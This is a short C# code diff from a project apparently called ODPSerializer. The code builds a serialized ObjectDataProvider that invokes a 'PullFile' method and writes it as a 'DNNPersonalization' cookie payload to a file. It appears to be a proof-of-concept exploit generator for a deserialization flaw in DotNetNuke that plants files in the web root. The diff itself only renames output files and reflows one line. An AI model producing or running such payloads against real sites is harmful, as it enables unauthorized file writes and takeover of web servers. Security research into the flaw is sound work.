@@ -19,13 +19,12 @@ namespace ODPSerializer
             myODP.MethodName = "PullFile";
             myODP.MethodParameters.Add("http://localhost:8000/test.txt");
 
-            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/PullFileTest.txt");
+            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/POC.txt");
             Hashtable table = new Hashtable();
             table["myTableEntry"] = myODP;
-            String payload = "; DNNPersonalization=" +
-            XmlUtils.SerializeDictionary(table, "profile");
+            String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
             TextWriter writer = new
-            StreamWriter("C:\\Users\\RICHAR\\Desktop\\PullFileTest.txt");
+            StreamWriter("C:\\Users\\RICHAR\\Desktop\\test.txt");
             writer.Write(payload);
             writer.Close();
             Console.WriteLine("Done!");
